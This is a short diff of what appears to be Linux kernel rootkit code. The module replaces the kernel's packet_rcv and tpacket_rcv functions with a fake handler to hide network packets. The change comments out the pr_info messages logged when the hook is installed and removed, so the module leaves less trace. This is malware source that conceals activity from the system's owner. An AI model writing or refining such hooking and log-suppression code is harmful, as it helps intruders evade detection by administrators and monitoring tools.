@@ -28,7 +28,7 @@ int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev,struct packet_ty
 }
 
 int init_packet_hide(void){
-	pr_info("init_packet_hide");
+	//pr_info("init_packet_hide");
 
 	strcpy(packet_rcv.function_name,"packet_rcv"); //function's name
 	packet_rcv.fake_function = &fake_packet_rcv; //fake function address
@@ -46,7 +46,7 @@ int init_packet_hide(void){
 }
 
 int exit_packet_hide(void){
-	pr_info("exit_packet_hide");
+	//pr_info("exit_packet_hide");
 
 	reset_function(&packet_rcv);
 	reset_function(&tpacket_rcv);
